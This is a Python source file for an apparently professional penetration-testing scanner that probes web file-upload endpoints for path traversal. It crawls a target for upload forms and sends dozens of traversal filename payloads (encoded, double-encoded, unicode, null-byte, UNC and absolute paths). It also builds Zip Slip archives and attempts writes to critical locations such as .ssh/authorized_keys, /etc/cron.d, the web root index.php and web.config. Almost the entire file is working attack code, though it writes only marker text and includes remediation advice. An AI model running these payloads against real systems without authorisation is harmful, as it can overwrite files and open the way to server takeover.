"""
Path Traversal in File Upload Scanner (Professional Pentesting Edition)
========================================================================

Advanced scanner detecting path traversal vulnerabilities in file upload
functionality using real-world penetration testing techniques.

Features:
- Directory traversal (../, ..\\, URL encoding)
- Absolute path injection (/var/www/, C:\\)
- Unicode normalization bypass
- Double encoding bypass
- Path separator manipulation
- Filename sanitization bypass
- ZIP file extraction path traversal

CWE: CWE-22 (Path Traversal), CWE-434, CWE-73
OWASP: A01:2021 - Broken Access Control

Author: BreachScan Professional Pentesting Framework
Version: 2.0.0
"""

import logging
import httpx
import asyncio
import hashlib
import os
from typing import Dict, List, Any, Optional, Tuple
from datetime import datetime
from urllib.parse import urljoin, urlparse
import zipfile
import io

logger = logging.getLogger(__name__)


class PathTraversalUploadScanner:
    """
    Professional-grade path traversal in file upload scanner
    
    Tests for:
    1. Directory traversal (../, ..\\)
    2. URL encoding bypass (%2e%2e%2f)
    3. Double encoding bypass (%252e%252e%252f)
    4. Unicode normalization bypass
    5. Absolute path injection
    6. Path separator manipulation
    7. OS-specific path attacks
    8. ZIP file extraction path traversal (Zip Slip)
    9. Null byte injection in path
    10. Overwrite system files
    """
    
    def __init__(self, target_url: str, timeout: int = None, **kwargs):
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.findings = []
        self.test_mode = kwargs.get('test_mode', 'aggressive')
        
        self.cookies = kwargs.get('session_cookies') or kwargs.get('cookies', {})
        
        # Generate unique marker
        self.scan_id = hashlib.md5(f"{target_url}{datetime.now().isoformat()}".encode()).hexdigest()[:8]
        self.unique_marker = f"PATHTRAVERSAL_{self.scan_id}"
        
        # Upload endpoints
        self.upload_endpoints = [
            '/upload', '/upload.php', '/api/upload', '/api/v1/upload',
            '/file/upload', '/files/upload', '/media/upload',
            '/admin/upload', '/user/upload', '/profile/upload',
            '/image/upload', '/avatar/upload', '/document/upload',
             '/files', '/file-upload', '/import', '/assignments', 
            '/upload-file', '/share', '/documents'
        ]
        
        # Path traversal payloads (professional pentesting collection)
        self.traversal_payloads = self._generate_traversal_payloads()
    
    def _generate_traversal_payloads(self) -> List[Tuple[str, str, str]]:
        """Generate comprehensive path traversal payloads"""
        
        payloads = []
        
        # 1. Basic directory traversal
        for depth in range(3, 8):
            # Unix
            payloads.append(('../' * depth + f'tmp/{self.unique_marker}.txt', 'basic_unix', f'depth_{depth}'))
            # Windows
            payloads.append(('..\\' * depth + f'Temp\\{self.unique_marker}.txt', 'basic_windows', f'depth_{depth}'))
        
        # 2. URL encoding variations
        payloads.extend([
            ('%2e%2e%2f' * 5 + f'tmp/{self.unique_marker}.txt', 'url_encoded', 'single'),
            ('%2e%2e/' * 5 + f'tmp/{self.unique_marker}.txt', 'url_encoded', 'mixed'),
            ('%2e%2e%5c' * 5 + f'Temp\\{self.unique_marker}.txt', 'url_encoded', 'windows'),
        ])
        
        # 3. Double URL encoding
        payloads.extend([
            ('%252e%252e%252f' * 5 + f'tmp/{self.unique_marker}.txt', 'double_encoded', 'full'),
            ('%252e%252e/' * 5 + f'tmp/{self.unique_marker}.txt', 'double_encoded', 'partial'),
        ])
        
        # 4. Dot-dot-slash variations
        payloads.extend([
            ('..../' * 5 + f'tmp/{self.unique_marker}.txt', 'dot_variation', 'extra_dots'),
            ('....' + '/' * 1 + '....' + '/' * 1 + f'tmp/{self.unique_marker}.txt', 'dot_variation', 'separated'),
            ('....//' * 5 + f'tmp/{self.unique_marker}.txt', 'dot_variation', 'double_slash'),
        ])
        
        # 5. Absolute paths (Unix)
        payloads.extend([
            (f'/tmp/{self.unique_marker}.txt', 'absolute_unix', 'tmp'),
            (f'/var/www/html/{self.unique_marker}.php', 'absolute_unix', 'webroot'),
            (f'/var/log/{self.unique_marker}.log', 'absolute_unix', 'log'),
            (f'/etc/cron.d/{self.unique_marker}', 'absolute_unix', 'cron'),
        ])
        
        # 6. Absolute paths (Windows)
        payloads.extend([
            (f'C:\\Temp\\{self.unique_marker}.txt', 'absolute_windows', 'temp'),
            (f'C:\\inetpub\\wwwroot\\{self.unique_marker}.aspx', 'absolute_windows', 'iis_webroot'),
            (f'C:\\Windows\\Temp\\{self.unique_marker}.txt', 'absolute_windows', 'windows_temp'),
        ])
        
        # 7. Unicode normalization bypass
        payloads.extend([
            ('..\u2216' * 3 + f'tmp/{self.unique_marker}.txt', 'unicode', 'backslash'),
            ('..\u2215' * 3 + f'tmp/{self.unique_marker}.txt', 'unicode', 'slash'),
            ('.\u002e/' * 5 + f'tmp/{self.unique_marker}.txt', 'unicode', 'dot'),
        ])
        
        # 8. UNC paths (Windows)
        payloads.extend([
            (f'\\\\localhost\\C$\\Temp\\{self.unique_marker}.txt', 'unc_path', 'localhost'),
            (f'\\\\127.0.0.1\\C$\\Temp\\{self.unique_marker}.txt', 'unc_path', 'ip'),
        ])
        
        # 9. Null byte injection
        payloads.extend([
            (f'../../../tmp/{self.unique_marker}.txt%00.jpg', 'null_byte', 'percent'),
            (f'../../../tmp/{self.unique_marker}.txt\x00.jpg', 'null_byte', 'literal'),
        ])
        
        # 10. Mixed path separators
        payloads.extend([
            ('../' * 2 + '..\\' + '../' + f'tmp/{self.unique_marker}.txt', 'mixed_separator', 'unix_windows'),
            ('..\\..' + '/../' + f'tmp/{self.unique_marker}.txt', 'mixed_separator', 'windows_unix'),
        ])
        
        # 11. Filter bypass techniques
        payloads.extend([
            ('..;/' * 5 + f'tmp/{self.unique_marker}.txt', 'filter_bypass', 'semicolon'),
            ('..<>/' * 5 + f'tmp/{self.unique_marker}.txt', 'filter_bypass', 'brackets'),
            ('..⁄' * 5 + f'tmp/{self.unique_marker}.txt', 'filter_bypass', 'unicode_slash'),
        ])
        
        return payloads
    
    async def _discover_upload_endpoints(self) -> List[str]:
        """Discover upload endpoints through crawling and common paths"""
        discovered = set()
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False, follow_redirects=True, cookies=self.cookies) as client:
            try:
                logger.info(f"[{self.scan_id}] Crawling base URL for upload forms: {self.target_url}")
                base_resp = await client.get(self.target_url)
                if base_resp.status_code == 200:
                    text = base_resp.text
                    import re
                    if 'type="file"' in text.lower() or 'multipart/form-data' in text.lower():
                        discovered.add(self.target_url)
                    
                    # Find Links
                    links = re.findall(r'href=["\'](.*?)["\']', text, re.IGNORECASE)
                    for link in links:
                        if link.startswith('#') or link.startswith('javascript:'): continue
                        if any(k in link.lower() for k in ['upload', 'file', 'import', 'attach', 'assignment', 'submit']):
                            full_url = urljoin(self.target_url, link)
                            if urlparse(full_url).scheme in ['http', 'https']:
                                discovered.add(full_url)
                    
                    # Find Actions
                    actions = re.findall(r'action=["\'](.*?)["\']', text, re.IGNORECASE)
                    for action in actions:
                         if any(k in action.lower() for k in ['upload', 'file', 'submit', 'save']):
                             full_url = urljoin(self.target_url, action)
                             discovered.add(full_url)
            except Exception as e:
                logger.debug(f"[{self.scan_id}] Crawling failed: {e}")

            # Test endpoints
            for endpoint in self.upload_endpoints:
                url = urljoin(self.target_url, endpoint)
                if url in discovered: continue
                try:
                    response = await client.get(url)
                    if response.status_code < 400:
                        content = response.text.lower()
                        if any(keyword in content for keyword in ['upload', 'file', 'attach', 'browse', 'input type="file"', 'directory']):
                            discovered.add(url)
                except: continue
        return list(discovered)

    async def scan(self) -> Dict[str, Any]:
        """Execute comprehensive path traversal scan"""
        
        logger.info(f"[{self.scan_id}] Starting Path Traversal Upload scan for {self.target_url}")
        
        # Discover endpoints
        discovered = await self._discover_upload_endpoints()
        if discovered:
            self.upload_endpoints = discovered
            logger.info(f"[{self.scan_id}] Discovered {len(discovered)} upload endpoints")
        else:
            logger.warning(f"[{self.scan_id}] No upload endpoints discovered, using defaults")
            
        logger.info(f"[{self.scan_id}] Testing {len(self.traversal_payloads)} path traversal variants")
        
        start_time = datetime.now()
        
        # Test standard file upload path traversal
        await self._test_standard_path_traversal()
        
        # Test ZIP file extraction path traversal (Zip Slip)
        await self._test_zip_slip()
        
        # Test file overwrite attempts
        await self._test_critical_file_overwrite()
        
        scan_duration = (datetime.now() - start_time).total_seconds()
        
        logger.info(f"[{self.scan_id}] Scan complete: {len(self.findings)} findings in {scan_duration:.2f}s")
        
        return self._generate_results(scan_duration)
    
    async def _test_standard_path_traversal(self):
        """Test standard file upload path traversal"""
        
        logger.debug(f"[{self.scan_id}] Testing standard path traversal")
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False, follow_redirects=True, cookies=self.cookies) as client:
            for upload_endpoint in self.upload_endpoints:
                upload_url = urljoin(self.target_url, upload_endpoint)
                
                for traversal_path, technique, variant in self.traversal_payloads:
                    try:
                        # Create test file content
                        content = f'{self.unique_marker}\nPath Traversal Test\n{datetime.now().isoformat()}'
                        
                        files = {'file': (traversal_path, content, 'text/plain')}
                        
                        logger.debug(f"[{self.scan_id}] Testing {technique}/{variant}: {traversal_path[:50]}...")
                        
                        response = await client.post(upload_url, files=files)
                        
                        # Check if upload was accepted
                        if self._is_upload_successful(response):
                            self._add_finding(
                                title='CRITICAL: Path Traversal in File Upload',
                                severity='critical',
                                description=f'Filename with path traversal accepted ({technique}/{variant}): {traversal_path}',
                                location=upload_url,
                                evidence={
                                    'upload_url': upload_url,
                                    'traversal_payload': traversal_path,
                                    'technique': technique,
                                    'variant': variant,
                                    'response_status': response.status_code,
                                    'response_snippet': response.text[:200]
                                },
                                cwe='CWE-22',
                                owasp='A01:2021 - Broken Access Control',
                                technique=f'Path Traversal ({technique})'
                            )
                            logger.warning(f"[{self.scan_id}] Path traversal accepted: {technique}/{variant}")
                            
                            # If one technique works, test a few more from same category
                            if technique in ['basic_unix', 'basic_windows', 'url_encoded']:
                                continue
                            else:
                                break  # Move to next endpoint for other techniques
                    
                    except Exception as e:
                        logger.debug(f"[{self.scan_id}] Error in path traversal test: {e}")
                        continue
    
    async def _test_zip_slip(self):
        """Test ZIP file extraction path traversal (Zip Slip)"""
        
        logger.debug(f"[{self.scan_id}] Testing Zip Slip vulnerability")
        
        # Create malicious ZIP file with path traversal
        zip_payloads = [
            (f'../../../tmp/{self.unique_marker}.txt', 'zip_slip_unix'),
            (f'..\\..\\..\\Temp\\{self.unique_marker}.txt', 'zip_slip_windows'),
            (f'/tmp/{self.unique_marker}.txt', 'zip_slip_absolute'),
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False, follow_redirects=True, cookies=self.cookies) as client:
            for upload_endpoint in self.upload_endpoints:
                upload_url = urljoin(self.target_url, upload_endpoint)
                
                for traversal_path, variant in zip_payloads:
                    try:
                        # Create ZIP file in memory
                        zip_buffer = io.BytesIO()
                        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
                            # Add file with traversal path
                            content = f'{self.unique_marker}\nZip Slip Test\n{datetime.now().isoformat()}'
                            zip_file.writestr(traversal_path, content)
                        
                        zip_buffer.seek(0)
                        
                        # Upload malicious ZIP
                        files = {'file': (f'archive_{self.scan_id}.zip', zip_buffer.getvalue(), 'application/zip')}
                        
                        logger.debug(f"[{self.scan_id}] Testing Zip Slip: {variant}")
                        
                        response = await client.post(upload_url, files=files)
                        
                        if self._is_upload_successful(response):
                            # Check if ZIP was extracted (common behavior)
                            if 'extract' in response.text.lower() or 'unzip' in response.text.lower():
                                self._add_finding(
                                    title='CRITICAL: Zip Slip Vulnerability',
                                    severity='critical',
                                    description=f'ZIP file with path traversal uploaded and potentially extracted ({variant})',
                                    location=upload_url,
                                    evidence={
                                        'upload_url': upload_url,
                                        'zip_filename': f'archive_{self.scan_id}.zip',
                                        'internal_path': traversal_path,
                                        'variant': variant,
                                        'auto_extraction': 'extract' in response.text.lower()
                                    },
                                    cwe='CWE-22',
                                    owasp='A01:2021 - Broken Access Control',
                                    technique='Zip Slip'
                                )
                                logger.critical(f"[{self.scan_id}] Zip Slip vulnerability found: {variant}")
                    
                    except Exception as e:
                        logger.debug(f"[{self.scan_id}] Error in Zip Slip test: {e}")
                        continue
    
    async def _test_critical_file_overwrite(self):
        """Test attempts to overwrite critical system files"""
        
        logger.debug(f"[{self.scan_id}] Testing critical file overwrite")
        
        # Critical file paths (testing only, use with caution)
        critical_files = [
            # Unix
            ('../../../etc/passwd.bak', 'etc_passwd_backup', 'high'),
            ('../../../var/www/html/index.php', 'webroot_index', 'critical'),
            ('../../../.ssh/authorized_keys', 'ssh_keys', 'critical'),
            # Windows
            ('..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts', 'windows_hosts', 'high'),
            ('..\\..\\..\\inetpub\\wwwroot\\web.config', 'iis_config', 'critical'),
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False, follow_redirects=True, cookies=self.cookies) as client:
            for upload_endpoint in self.upload_endpoints:
                upload_url = urljoin(self.target_url, upload_endpoint)
                
                for file_path, file_type, severity in critical_files:
                    try:
                        content = f'{self.unique_marker}\nCritical File Overwrite Test\nDO NOT DEPLOY TO PRODUCTION!'
                        
                        files = {'file': (file_path, content, 'text/plain')}
                        
                        logger.debug(f"[{self.scan_id}] Testing overwrite: {file_type}")
                        
                        response = await client.post(upload_url, files=files)
                        
                        if self._is_upload_successful(response):
                            self._add_finding(
                                title=f'{severity.upper()}: Potential Critical File Overwrite',
                                severity=severity,
                                description=f'Upload with path to critical file accepted: {file_path}',
                                location=upload_url,
                                evidence={
                                    'upload_url': upload_url,
                                    'target_file': file_path,
                                    'file_type': file_type,
                                    'impact': 'Could overwrite critical system files'
                                },
                                cwe='CWE-73',
                                owasp='A01:2021 - Broken Access Control',
                                technique='Critical File Overwrite'
                            )
                            logger.warning(f"[{self.scan_id}] Critical file path accepted: {file_type}")
                    
                    except Exception as e:
                        logger.debug(f"[{self.scan_id}] Error in file overwrite test: {e}")
                        continue
    
    def _is_upload_successful(self, response: httpx.Response) -> bool:
        """Determine if upload was successful"""
        
        if response.status_code >= 400:
            return False
        
        content_lower = response.text.lower()
        
        success_indicators = [
            'success', 'uploaded', 'saved', 'received', 
            'accepted', 'complete', 'file has been'
        ]
        
        error_indicators = [
            'error', 'failed', 'invalid', 'not allowed',
            'forbidden', 'rejected', 'denied', 'blocked'
        ]
        
        has_success = any(indicator in content_lower for indicator in success_indicators)
        has_error = any(indicator in content_lower for indicator in error_indicators)
        
        return has_success and not has_error
    
    def _add_finding(self, title: str, severity: str, description: str, 
                     location: str, evidence: Dict, cwe: str, owasp: str, technique: str):
        """Add a vulnerability finding"""
        
        finding = {
            'id': f"path_traversal_{len(self.findings)}_{self.scan_id}",
            'title': title,
            'severity': severity,
            'description': description,
            'location': location,
            'evidence': evidence,
            'cwe': cwe,
            'owasp': owasp,
            'technique': technique,
            'timestamp': datetime.now().isoformat(),
            'recommendation': self._get_recommendation(technique)
        }
        
        self.findings.append(finding)
    
    def _get_recommendation(self, technique: str) -> str:
        """Get remediation recommendation"""
        
        recommendations = {
            'Path Traversal (basic_unix)': 'Sanitize filenames by removing directory separators. Use whitelist for allowed characters. Store files with random names.',
            'Path Traversal (basic_windows)': 'Normalize path separators. Reject filenames containing \\ or /. Use secure file handling APIs.',
            'Path Traversal (url_encoded)': 'Decode filenames before validation. Apply URL decoding recursively. Reject encoded traversal sequences.',
            'Path Traversal (double_encoded)': 'Apply multiple rounds of decoding. Validate after each decoding step. Use encoding-aware validation.',
            'Zip Slip': 'Validate all file paths in ZIP archives before extraction. Reject any paths containing .. or absolute paths. Use safe ZIP libraries.',
            'Critical File Overwrite': 'Use random filenames for uploads. Store uploads outside application directories. Implement strict path validation.'
        }
        
        return recommendations.get(technique, 'Implement comprehensive filename and path validation. Use secure file handling practices.')
    
    def _generate_results(self, scan_duration: float) -> Dict[str, Any]:
        """Generate scan results"""
        
        severity_counts = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0, 'info': 0}
        for finding in self.findings:
            severity = finding.get('severity', 'info').lower()
            if severity in severity_counts:
                severity_counts[severity] += 1
        
        return {
            'scanner': 'Path Traversal Upload Scanner (Professional Edition)',
            'scan_id': self.scan_id,
            'target': self.target_url,
            'status': 'completed',
            'test_mode': self.test_mode,
            'payloads_tested': len(self.traversal_payloads),
            'findings': self.findings,
            'summary': {
                'total_findings': len(self.findings),
                'severity_distribution': severity_counts,
                'scan_duration_seconds': scan_duration
            },
            'timestamp': datetime.now().isoformat()
        }


def create_scanner(target_url: str, **kwargs):
    """Factory function to create scanner instance"""
    return PathTraversalUploadScanner(target_url, **kwargs)
